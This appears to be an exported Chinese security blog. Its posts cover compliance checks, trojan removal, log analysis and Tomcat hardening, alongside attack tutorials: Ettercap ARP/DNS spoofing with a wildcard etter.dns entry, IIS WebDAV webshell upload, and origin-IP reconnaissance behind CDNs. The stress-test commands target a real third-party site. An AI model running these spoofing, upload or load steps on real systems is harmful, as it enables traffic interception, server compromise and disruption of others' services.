    <content type="text"><![CDATA[物理安全测评说明物理安全测评共有10步，分别是机房物理位置的选择、机房物理的访问控制、防盗窃和防破坏、防雷击、防火、防水和防潮、防静电、温湿度控制、电力供应、电磁防护，如下是步骤详解。 现场检测步骤和预期结果机房物理位置的选择a)机房和办公场地应选择在具有防震、防风和防雨等能力的建筑内。1.查看机房是否设置在在具有防风、防雨能力的建筑内，对防震能力，先询问机房建设等级，如可以看建设文档，则请求查看建设文档，但一般机房管理员不知情，机房所在建筑肉眼可见非危楼即可默认符合。 b)机房场地应避免设在建筑物的高层或地下室，以及用水设备的下层和隔壁。1.机房不应该设置在顶楼和负一楼，因为顶楼渗水的风险较大，且太阳直射温度较高，负一楼存在雨水倒灌和易受潮的风险。2.机房左右是否有厕所、厨房设备间，如机房在顶楼，需要注意机房上方是否有蓄水罐。 物理访问控制a)机房出入口应安排专人值守，控制、鉴别和记录进入的人员。1.检查一下机房外是否有专人值守或者是否设置了电子门禁系统（满足一个即可），如有专人值守，则应有人员进出机房的记录文件；如设置了电子门禁系统，则电子门禁系统需要有来访人员身份记录，且记录信息需要保持6个月以上。 b)需进入机房的来访人员应经过申请和审批流程，并限制和监控其活动范围。1.查看进入机房检查是否需要提前申请（口头、电话、电子或纸质申请单均算）进入机房是否有配合人员全程随同。（需要记录机房有几个门，分别做什么用，是否有门禁）。 c)应对机房划分区域进行管理，区域和区域之间设置物理隔离装置，在重要区域前设置交付或安装过度区域。1.对机房是否划分了不同的区域，如UPS房间、主要设备间、存储设备间或操作间等区，中间是否有墙壁（玻璃或实体墙壁或其他具有防火功能隔离物均符合）隔离开，如下图。机房分为哪几个区，每个区的功能，并画出机房分区草图。 d)重要区域应配置电子门禁系统，控制、鉴别和记录进入的人员。1.进入主机房或存放网络设备、服务器、存储设备的区域是否需有单独电子门禁？如上图所示。进入机房绿色区域是一个门禁权限，进入红色区域还会有电子门禁权限。 防盗窃和防破坏a)应将主要设备放置在机房内。1.主要设备指网络设备（核心、汇聚交换机等）、安全设备（waf、fw、IPS、流控、上网行为管理等）、服务器（虚拟服务器的物理机、普通服务机）、存储设备等。 b)应将设备或主要部件进行固定，并设置明显的不易除去的标记。1.检查设备是否都固定在机柜上，设备上是否有打标签。 c)应将通信线缆铺设在隐蔽处，可铺设在地下或管道中。下图均符合： d)应对介质分类标识，存储在介质库或档案室中。介质定义：1.设备的相关文档说明书、光盘；2.备用的或未上架或待维修的网络设备、存储设备；3.机房运维工具；检查时注意：1.主机房不能堆放杂物;2.最好有存储房间或有存储柜（储物柜需要分类）分类存放上述物品。 e)应利用光、电等技术设置机房防盗报警系统。1.查看是否有红外探测设置防盗报警系统。红外探测，一般布在机房入口通道，或有其他动设备会自动报警的设备或技术也算。 f)应对机房设置监控报警系统。1.检查机房是否有监控摄像头（如无不符合），检查机房每排机柜间和各设备间入口是否有摄像头监控（部分符合），检查监控是否可正常查看（如无不符合），检查监控是否可保存3个月以上（部分符合）。结果记录需要写清楚有几个摄像头，分别对应的位置。 防雷击a)机房建筑应设置避雷装置。一般机房所在大楼会安装避雷针，询问即可，正规会有防雷检测报告，如有报告最好，一般符合。 b)应设置防雷保安器，防止感应雷。一般UPS会提供电流过滤的设置，但也会单独设置防雷箱，一般在市电进入到UPS之前的位置布置。如无防雷箱，不符合，如机柜使用普通接线板，不符合，如两者有一个符合，算部分符合。 c)机房应设置交流电源地线。1.需要掀开地板查看，下图中防雷接地铜片或铜线算符合，如无不符合。 防火a)机房应设置火灾自动消防系统，能够自动检测火情、自动报警，并自动灭火。检查机房是否有自动灭火系统，是否设置有七氟丙烷等自动灭火设备。如果仅有手提式灭火器，不符合。此处需要检查罐体气压，如指针在绿色，气压正常，在红色区域，气压不正常，可算为部分符合。如果条件允许，需要查看巡检记录和方式。 b)机房及相关的工作房间和辅助房应具有耐火等级的建筑材料。现场检测查看是否有如木板、塑料地毯和纸质挡板等易燃的物品，如果有，算不符合或部分符合，最好是用玻璃或墙体隔离。 c)机房应采取区域隔离防火措施，将重要设备与其他设备隔离开。1.不同区域隔离要有墙体或其他隔离方式，如仅过道隔离算不符合。 防水和防潮a)水管安装，不得穿过机房屋顶和活动地板下。查看机房顶部或地板下是否有水管（空调水管除外）穿过，如有，算不符合。 b)应采取措施防止雨水通过机房窗口、屋顶和墙壁渗透。此处应检查是否有窗口，如无法打开符合，可打开算部分符合，现场查看墙壁、屋顶和窗户处是否有渗水的痕迹，如有均算不符。此处需要注意空调外接口需要封闭，如未彻底封闭算不符。 c)应采取措施防止机房内水蒸气结露和地下积水的转移和渗透。查看是否有环控或设有水汽凝结探测仪（也有叫水神、探测头、感应器），如有，算符合，没有询问是否有其他措施，如果没有，不符合。 d)应安装对水敏感的检测仪表或元件，对机房进行防水检测和报警。参考上述c。 防静电a)主要设备应采用必要的接地防静电措施。1.设备需要使用三角插口，如有发现两脚插口或普通接线板（如家用公牛接线板）均算不符。2.机柜需要接地，任意一项符合算部分符合，两项均符合给5分。 b)机房应采用防静电地板。1.机房使用静电地板均符合，尚未对静电地板的质量和损坏程度有要求。 温湿度控制a)机房应设置温、湿度自动调节设施，使机房温、湿度的变化在设备运行所允许的范围之内。1.检查机房是否有具有自动调节温湿度的精密空调，并记录当前温湿度范围，并检查空调厂商巡检维护记录，如使用普通家用空调或无自动调节的吸顶空调或温湿度不在范围内，均算不符合。符合范围：温度21~25摄氏度之间，湿度45%～65%之间。空调送风有的是设备自带出风口，有的走地板下出风，有的吸顶空调出风。天花板上出风口需要注意下方是否有机柜，因可能存在出风口结露下滴的情况。 电力供应a)应在机房供电线缆上配置稳压器和过电压防护设备。1.机房需要配有UPS设备，如无则算不符合。 b)应提供短期的备用电力供应，至少满足主要设备在断电情况下的正常运行要求。1.参考第一条，如电池可提供临时供电即可，但需要记录一下UPS电池支撑的时间。 c)应设置冗余或并行的电力电缆线路为计算机系统供电。机房需要有两条市电线路接入到机房，一般此种情况需要两路市电接入，到每个机柜均有两组PDU，设备有双电源可分别接在不同路电源上，如无不符合。 d)应建立备用供电系统。机房是否有备用发电机房，如柴油发电机等发电设备，如无则不符合。 电磁防护a)应采用接地方式防止外界电磁干扰和设备寄生耦合干扰。设备和机柜均需要接地。 b)电源线和通信线缆应隔离铺设，避免互相干扰。强电（电源线）和弱电（通信线）需要隔离铺设，常见隔离方式：强电走地板下，弱电走高架桥，或强弱电均走高架桥，但不同桥架分开，或均走地下，但采用不同线槽走，如强弱电在地板下或高架上均走一起未严格区分，算不符合。 c)应对关键网络设备和磁介质实施电磁屏蔽。1.机柜的柜门设有防止外界电磁干扰的屏蔽门，即为合格。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Ettercap实现DNS欺骗]]></title>
    <url>%2F2017%2F06%2F11%2F%E4%BD%BF%E7%94%A8Ettercap%E5%AE%9E%E7%8E%B0DNS%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[DNS欺骗原理DNS欺骗是一种中间人攻击形式，它是攻击者冒充域名服务器的一种欺骗行为，它主要用于向主机提供错误DNS信息，当用户尝试浏览网页，例如IP地址为XXX.XX.XX.XX ，网址为www.xxx.com，而被欺骗之后访问的地址为YYY.YY.YY.YY上的www.bankofamerica.com ，用户上网就只能看到攻击者的主页，而不是用户想要取得的真实的网站的主页了，这个网址是攻击者用以窃取网上银行登录证书以及帐号信息的假冒网址，DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。 Ettercap介绍Ettercap是一个用于基于中间人方式的攻击的免费的开源综合工具套件。可用于计算机网络协议分析和安全审计，它的功能有嗅探活动的连接、内容过滤、以及对多种协议的主动和被动解析的支持。Ettercap通过将攻击者的网卡置入混杂模式以及对受害者的机器进行ARP污染来工作。 使用Ettercap实现配置Ettercap的DNS文件1geditor /etc/ettercap/etter.dns 在文件中加入：12* A 192.168.0.118* PTR 192.168.0.118 这里的ip地址为我们kali的ip地址，被欺骗的解析的ip地址就是我们kali的ip地址。 开启Web服务kali中默认安装了apache，开启服务：1service apache2 start Web环境默认目录在var/www/html下： 启动Ettercap1ettercap -G 选择用于嗅探的网卡切换到Sniff标签，选择嗅探的类型为Unified sniffing：选择网卡：现在Ettercap会显示出更多的选项。 扫描主机扫描C段网络主机：通常路由器是第一个找到的主机。.1为路由器，.101为受害主机。 设置目标将路由器设为目标1，受害主机设为目标2。这样会将我们的Kali系统放在受害人和路由器之间，整个都是经典的中间人攻击形式。 配置中间人选项对目标设备进行ARP缓存中毒攻击以重新路由通过攻击主机的目标设备的通信，这样我们就能够拦截DNS查询请求，然后就能够发送欺骗性的数据包。 配置插件 开始欺骗配置完成之后，点击Start：这样欺骗及开始工作了。 受害机访问测试访问百度： 注意，如果不设置目标，不设置中间人选线，直接开始DNS欺骗，则局域网中所有机器都会被欺骗。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DoS攻击]]></title>
    <url>%2F2017%2F06%2F07%2FDoS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[简介拒绝服务攻击，它利用协议或系统的缺陷，采用欺骗的策略进行网络攻击，最终目的是使目标主机因为资源全部被占用而不能处理合法用户提出的请求，即对外表现为拒绝提供服务。 分类 SYN-Flood洪水攻击SYN-Flood洪水攻击是当前最常见一种DoS与DDoS攻击方式，它利用了TCP协议缺陷进行攻击。我们先简单回顾TCP三次握手的过程：首先，客户端发送一个包含SYN同步标志的TCP报文，请求和服务器端连接；服务器将返回一个SYN+ACK的报文，表示接受客户端的连接请求；客户端随即返回一个确认报文ACK给服务器端，至此一个TCP连接完成。SYN-Flood攻击者攻击前伪造一个源IP非自身IP的SYN报文，将此报文发送给服务器端，服务器端在发出SYN+ACK应答报文后是无法收到客户端的ACK报文的（第三次握手无法完成），这种情况下服务器端一般会重新发送SYN+ACK给客户端，并等待一段时间后丢弃这个未完成的连接，当攻击者发出大量这种伪造的SYN报文时，服务器端将产生大量的”半开连接”，消耗非常多的CPU和内存资源，结果导致服务器端计算机无法响应合法用户的请求了。此时从正常客户的角度看来，服务器失去响应。对于SYN攻击，可以通过减少服务器端计算机SYN+ACK应答报文重发次数和等待时间进行一定程度上的防范，但对于高速度发来的SYN包，这种方法也无能为力。 Land攻击Land攻击也是DoS与DDoS攻击中经常采用的一种攻击方法。在Land攻击中，发送给目标主机的SYN包中的源地址和目标地址都被设置成目标主机的IP地址，这将使目标主机向它自己的IP地址发送SYN-ACK消息，结果这个地址又发回ACK消息并创建一个空连接，每一个这样的连接都将保留直到超时。这样也会占用大量资源，严重时UNIX系统往往崩溃，而Windows 系统也会变的极其缓慢。预防Land攻击的最好办法是通过配置防火墙，过滤掉从外部发来的确含有内部源IP地址的数据包。 Smurf攻击Smurf是采用了放大效果的一种DoS攻击，这种攻击形式利用了TCP/IP中的定向广播特性，由攻击者向网络中的广播设备发送源地址假冒为被攻击者地址的ICMP响应请求数据包，由于广播的原因，网络上的所有收到这个数据包的计算机都会向被攻击者做出回应，从而导致受害者不堪重负而崩溃。为了防范这种攻击，最好关闭外部路由器或防火墙的地址广播功能。还有一种Fraggle攻击原理和smurf攻击原理相同，只不过使用的UDP应答消息而不是ICMP。可以通过在防火墙上过滤UDP应答消息实现对这种攻击的防范。 UDP-Flood攻击UDP-Flood攻击也是利用TCP/IP服务来进行，它利用了Chargen和Echo来回传送毫无用处的数据来占用所有的带宽。在攻击过程中，伪造与某一计算机的Chargen服务之间的一次UDP连接，而回复地址指向开着Echo服务的一台计算机，这样就生成在两台计算机之间的大量的无用数据流，如果数据流足够多，就会导致带宽完全被占用而拒绝提供服务。防范UDPFlood攻击的办法是关掉不必要的TCP/IP服务，或者配置防火墙以阻断来自Internet的UDP服务请求。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS write 漏洞利用]]></title>
    <url>%2F2017%2F06%2F07%2FIIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[前言IIS写权限对网站系统的安全是致命的，拥有写权限意味着可以直接往网站目录写文件，在拥有写权限的服务器上，其安全相对设置薄弱，因此比较容易被入侵者控制。 安全配置IIS服务器开启WebDAV服务扩展之后，会开启http的OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH这些方法。如果同时IIS的网站目录有写入权限的话，此时开启PUT、MOVE等这些方法是非常危险的，攻击者能够上传weshell。 检测方法使用IISPutScanner v1.3进行检测，查看服务器是否开启了PUT方法：若为开启状态，可以尝试右键单击主机进行上传测试：注意，该工具不能上传脚本文件，需要使用另一个工具，对IIS写权限利用工具.exe 利用方法打开该工具，选用put方法，上传一个txt文件，文件内容可以是webshell或者一句话木马，上传该txt文件，提交数据包：上传成功之后，成功以txt类型访问：接下来在iiswrite中将方法改为move，然后重新提交，会发现黑色部分Destination是指生成的asp文件地址，如图所示：然后访问该文件即可。 修复方法禁用WebDAV：]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统日志文件]]></title>
    <url>%2F2017%2F06%2F06%2FLinux%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux中的日志文件介绍20个位于“/var/log/”目录之下的日志文件。其中一些只有特定版本采用，如dpkg.log只能在基于Debian的系统中看到。/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。/var/log/boot.log — 包含系统启动时的日志。/var/log/daemon.log — 包含各种系统后台守护进程日志信息。/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。/var/log/maillog或/var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。/var/log/user.log — 记录所有等级用户信息的日志。/var/log/Xorg.x.log — 来自X的日志信息。/var/log/alternatives.log – 更新替代信息都记录在这个文件中。/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，“last -f /var/log/btmp | more”。/var/log/cups — 涉及所有打印信息的日志。/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。/var/log/yum.log — 包含使用yum安装的软件包信息。/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等，执行“who /var/log/wtmp”。/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。 除了上述Log文件以外，/var/log还基于系统的具体应用包含以下一些子目录：/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。/var/log/mail/ – 这个子目录包含邮件服务器的额外日志。/var/log/prelink/ — 包含.so文件被prelink修改的信息。/var/log/audit/ — 包含被 Linux audit daemon储存的信息。/var/log/samba/ – 包含由samba存储的信息。/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。/var/log/sssd/ – 用于守护进程安全服务。 最近使用的命令查看1history]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[冰河木马查杀]]></title>
    <url>%2F2017%2F06%2F05%2F%E5%86%B0%E6%B2%B3%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%2F</url>
    <content type="text"><![CDATA[木马木马是隐藏在正常程序中的具有特殊功能恶意代码，是具备破坏，删除和修改文件，发送密码，记录键盘，实施Dos攻击后门程序。它隐藏在目标计算机里，可以随计算机自动启动并在某一端口监听来自控制端的控制信息。木马工作原理包含如下三点： 传统连接技术一般木马都采用C/S(client/server,即服务器/客户端)运行模式，因此它分为两部分，即客户端和服务前端木马程序。其原理是，当服务器端程序在目标计算机上被执行后，一般会打开一个默认的端口进行监听，当客户端向服务器端主动提出连接请求，服务器端的木马程序就会自动运行，来应答客户端的请求，从而建立连接。第一代和第二代木马就采用这种方式。冰河木马属于此类。 反弹端口技术随着防火墙技术的发展，它可有效拦截从外部主动发起的连接的木马程序。但防火墙对内部发起的连接请求则认为是正常连接，第三代第四代木马就是利用这个缺点，其服务器端程序主动发起对外连接请求，再通过某些方式连接到木马的客户端，就是说“反弹式”木马是服务器端主动发起连接请求，而客户端是被动的连接。 线程插入技术一个应用程序在运行之后，会在系统之中产生一个进程，同时，每个进程分别对应了一个不同的进程标识符。系统会分配一个虚拟的内存空间地址段给这个进程，一切相关的程序操作，都会在这个虚拟的空间中进行。一般情况下，线程之间是相互独立的，当一个线程发生错误的时候，并不一定会导致整个进程的崩溃。“线程插入”技术就是利用线程之间运行的相对独立性，使木马完全地融进了系统那个内核。系统运行时会有很多的进程，而每个进程又有许多的线程，这就导致了查杀利用“线程插入”技术木马程序的难度。 冰河木马木马分为客户端和服务端：G_client.exe和G_server.exe，被控制端运行G_server.exe，控制端使用G_client.exe。被控制端运行G_server.exe之后，会默认开放7626端口（据说是冰河的生日），将自身写入注册表，修改.txt文件的默认打开方式为sysexplr.exe（木马程序），这样系统重启之后，只要受害者打开.txt文件，服务器端木马就会运行。客户端运行G_client.exe之后，打开冰河控制界面，添加主机，建立连接之后能够远程控制目标主机。具有文件管理和执行命令的功能。服务器端的程序可以由客户端配置密码：启动客户端-&gt;设置-&gt;配置服务器-&gt;添加密码。 服务器端冰河木马查杀 清理注册表cmd-&gt;regedit依次打开：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run，该目录中会存在木马添加的一个默认键值：C:\WINNT\System32\kernel32.exe，删除之。依次打开：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Runservices，目录中也会存在木马添加的默认键值：C:\WINNT\System32\kernel32.exe，删除之。 删除木马可执行文件进入目录：C:\WINNT\System32，找到冰河木马的两个可执行文件Kernel32.exe和Sysexplr.exe文件，删除之。 修复.txt文件默认打开方式冰河木马将.txt文件的缺省打开方式由notepad.exe改为木马的启动程序，打开注册表，HKEY_CLASSES_ROOT\txtfile\Shell\open\command，修改C:\Windows\System32\Sysexplr.exe%1为正常的C:\Windows\notepad.exe%1即可。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CMS识别方法]]></title>
    <url>%2F2017%2F06%2F05%2FCMS%E8%AF%86%E5%88%AB%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[根据文件robots.txt判断很多robots都会有CMS的版本信息，一般在头部居多。robots.txt文件是一个文本文件，也是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉爬虫程序在服务器上什么文件是可以被查看的。如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。一般用关键字：disallow来定义哪些不允许爬行。该文件一般存放在网站的根目录下。 工具识别原理：不同的cms都有自己独特的目录或者文件，工具扫描这些文件是否存在来判断cms属于哪种；工具：御剑Web指纹识别系统；whatweb（linux平台）； 查看网页底部信息例如，织梦的会存在powered by DedeCms： 在线CMS识别网站http://whatweb.bugscaner.com/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用CDN加速的网站如何查找真实IP]]></title>
    <url>%2F2017%2F06%2F05%2F%E4%BD%BF%E7%94%A8CDN%E5%8A%A0%E9%80%9F%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%2F</url>
    <content type="text"><![CDATA[什么是CDN？参考文章，https://www.zhihu.com/question/37353035实际在访问一个网站的时候，可能访问的并不是网站真实的服务器ip地址，可能访问的是cdn的缓存服务器。 如何识别网站是否采用cdn加速？ nslookup命令：1nslookup www.baidu.com 若有多个ip地址，证明采用了cdn加速。 ping检测工具使用站长之家的ping工具查询，站长之家：ping.chinaz.com，如果各个地方解析的ip地址不一样或者是有多个，证明采用了cdn加速。 如何查找网站的真实IP地址？ 二级域名通过二级域名查找。找到网站的二级域名，查询二级域名的ip地址，可能分站没有采用cdn加速，而主站和分站放在同一台服务器上，或者是在同一个网段，然后进行c段扫描，也许能够找到主站的真是ip。 邮件服务器如果对方的网站能够注册，并且使用了邮件认证，那么我们可以尝试注册，接收验证邮箱之后，找到发件人的邮件服务器地址，再通过c段查询。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[手工木马检测]]></title>
    <url>%2F2017%2F06%2F04%2F%E6%89%8B%E5%B7%A5%E6%9C%A8%E9%A9%AC%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[检查网络连接情况由于不少木马会主动侦听端口，或者会连接特定的IP和端口，所以我们可以在没有正常程序连接网络的情况下，通过检查网络连情情况来发现木马的存在。使用的命令为：1netstat -ano 查看正在运行的服务服务是很多木马用来保持自己在系统中永远能处于运行状态的方法之一。我们可以通过点击“开始”-&gt;“运行”-&gt;“cmd”，然后输入“net start”来查看系统中究竟有什么服务处于运行状态，如果发现了不是自己开放的服务，我们可以进入“服务”管理工具中的“服务”，找到相应的服务，停止并禁用它。 检查系统启动项由于注册表对于普通用户来说比较复杂，木马常常喜欢隐藏在这里。检查的项目为：123HKEY_LOCAL_MACHINE/Software/Microsoft/Windows/CurrentVersionHKEY_CURRENT_USERS/software/Microsoft/Windows/CurrentVersionHKEY-USERS/.Default/Software/Microsoft/Windows/CurrentVersion 以上项目中所有以“run”开头的键值。 system.ini文件Windows安装目录下的system.ini也是木马喜欢隐蔽的地方。打开这个文件看看，打开C盘下的windows目录，找到system.ini文件：在该文件的[boot]字段中，是不是有shell=Explorer.exe file.exe这样的内容，如有这样的内容，那这里的file.exe就是木马程序了! 检查系统帐户恶意的攻击者喜欢在电脑中留有一个账户的方法来控制你的计算机。他们采用的方法就是激活一个系统中的默认账户，但这个账户却很少使用，然后把这个账户的权限提升为管理员权限，这个帐户将是系统中最大的安全隐患。恶意的攻击者可以通过这个账户任意地控制你的计算机。如果系统中管理员组存在其他的帐户，那么很有可能是被入侵了：1net localgroup administrators]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网页防篡改技术原理]]></title>
    <url>%2F2017%2F06%2F03%2F%E7%BD%91%E9%A1%B5%E9%98%B2%E7%AF%A1%E6%94%B9%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[网页防篡改的原理主要有三种： 外挂轮询技术是利用一个网页检测程序，以轮询方式读出要监控的网页，与真实网页相比较，来判断网页内容的完整性，对于被篡改的网页进行报警和恢复。 核心内嵌技术是将篡改检测模块内嵌在Web服务器软件里，它在每一个网页流出时都进行完整性检查，对于篡改网页进行实时访问阻断，并予以报警和恢复。 事件触发技术是利用操作系统的文件系统接口，在网页文件的被修改时进行合法性检查，对于非法操作进行报警和恢复。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[IIS日志分析工具]]></title>
    <url>%2F2017%2F06%2F03%2FIIS%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[发现一个强大的图形化IIS日志分析工具：Log Parser Studio。 安装 需要先安装Log Parser下载地址：http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659安装Log Parser Studio 下载地址：http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765 运行安装完成第一个文件之后，解压第二个文件，直接运行LPS.exe即可。 查询 导入导入IIS日志文件或者日志目录都可以： 创建查询点击“Create a new queyr”按钮，修改查询语句中的“LOGFILEPATH”： 修改日志类型查询设置日志类型，然后点击查询：]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat的安全性分析和安全配置]]></title>
    <url>%2F2017%2F06%2F01%2FTomcat%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E5%92%8C%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Tomcat的安装下载地址：http://tomcat.apache.org/建议下载二进制免安装版：解压缩之后，配置好环境变量即可运行。配置环境变量： 启动服务：进入到tomcat的目录下的bin目录，命令行运行startup.bat。启动完成如下： 用户的配置Tomcat的用户配置在安装目录下的conf文件夹下的tomcat-users.xml中进行。在文件尾处添加如下用户：12345&lt;role rolename="tomcat"/&gt;&lt;role rolename="role1"/&gt;&lt;role rolename="admin-gui"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;user username="admin" password="admin" roles="admin-gui,manager-gui,tomcat,role1"/&gt; 需要注意的是，添加完用户之后，需要重启服务器，用户只有继承了”manager-gui”权限，才能管理网站的部署。添加完用户之后，需要重启服务器。 角色名只能为以下四种：manager-gui：访问这个HTML接口；manager-status：只能访问Server Status（服务器状态）页面；manager-script：访问本文档描述的工具友好的纯文本页面和服务器状态页面；manager-jmx：访问JMX代理接口和服务器状态页面；其中manager-gui是权限最高的角色。 Tomcat部署war包war包的生成使用jdk自带的命令jar.exe，安装好jdk，配置好环境变量之后，命令行输入jar.exe,出现帮助信息，证明软件安装无误：进入需要打包的文件目录，如下为“01文件夹”：命令行执行：1jar.exe -cvf 包名.war * 将该目录下的所有文件进行打包生成war文件： 部署启动Tomcat服务，默认的管理后台地址是：http://127.0.0.1:8080/访问该地址，点击“Manager APP”，输入账号密码之后，即可以进入管理页面：在tomcat的安装目录中的webapps文件夹中能够看到我们刚才部署的文件：浏览器访问“http://localhost:8080/xdd/xdd.jsp”： Tomcat的安全配置禁用目录访问配置文件：web.xml（/conf/2017/06/01/Web.xml）listings设置为false： 修改默认端口、默认超时时间参数配置文件：server.xml（/conf/server.xml） 修改默认账户密码配置文件：tomcat-users.xml（/conf/tomcat-users.xml）]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web服务器压力测试]]></title>
    <url>%2F2017%2F06%2F01%2FWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[前言一个网站或者博客到底能够承受多大的用户访问量经常是我们在用VPS或者独立服务器搭建网站了最关心的问题，还有不少人喜欢对LNMP或者LAMP进行一些优化以便提高Web性能，而优化后到底有多大的效果，就需要我们对网站进行服务器压力测试了。目前来说Webbench，Apache Bench，http_load是三款比较流行的网站服务器压力Web性能测试工具，安装和使用都非常简单，只要有一台VPS主机或者直接用本地电脑就可以开始测试，由于受网络等各种因素的影响，测试结果不一定很准确，但可以当作参考。 软件介绍Apache BenchApache Bench又叫做AB，是Apache附带的一个小工具，专门用于HTTP Server的benchmark testing，ab命令会创建很多的并发访问线程，模拟多个访问者同时对某一URL进行访问，可用来测试Apache的负载压力，也可以测试nginx、lighthttp、IIS等其它Web服务器的压力。WebbenchWebbench是由Lionbridge公司开发出来的一个网站压力测试工具，可用于测试ASP,PHP,JAVA,CGI等服务器压力，也可用于SSL的安全网站的负载能力进行测试，最多可以模拟3万个并发连接去测试网站的负载能力，Webbench操作简单，一行命令就可以显示出服务器压力。http_load这是国外一个博主开发的基于linux平台的性能测试工具，主要是以并行复用的方式运行，可以用来测试web服务器的吞吐量与负载，测试结果一目了然。 Apache Bench,Webbench,http_load这三款网站服务器压力测试工具还要根据测试者的主机性能来决定参数，防止把测试主机给搞成死机了。 Apache Bench：Apache自带服务器压力测试工具Apache Bench是Apache自带的一款功能强大的测试工具，安装了Apache一般就自带了。在Apache的安装目录下的bin文件夹中：ab.exe。Apache Bench工具用法命令：1ab -n 100 -c 50 http://www.qq.com/ “-n”表示：每次请求数，默认不能超过1024个，“-c”表示：请求的并发连接数，模拟客户端的数量。被测试的网站服务器可以在日志中查看到Apache Bench工具访问的记录： Webbench：最多模拟3万个并发连接数测试压力Webbench最多可以模拟3万个并发连接数来对服务器进行压力测试，可以设置压力测试时间。安装Webbench命令：12345apt-get install ctagswget http://home.tiscali.cz/~cz210552/distfiles/webbench-1.5.tar.gztar zxvf webbench-1.5.tar.gzcd webbench-1.5make &amp;&amp; make install Webbench测试命令是：1webbench -c 100 -t 10 http://www.qq.com/index.php 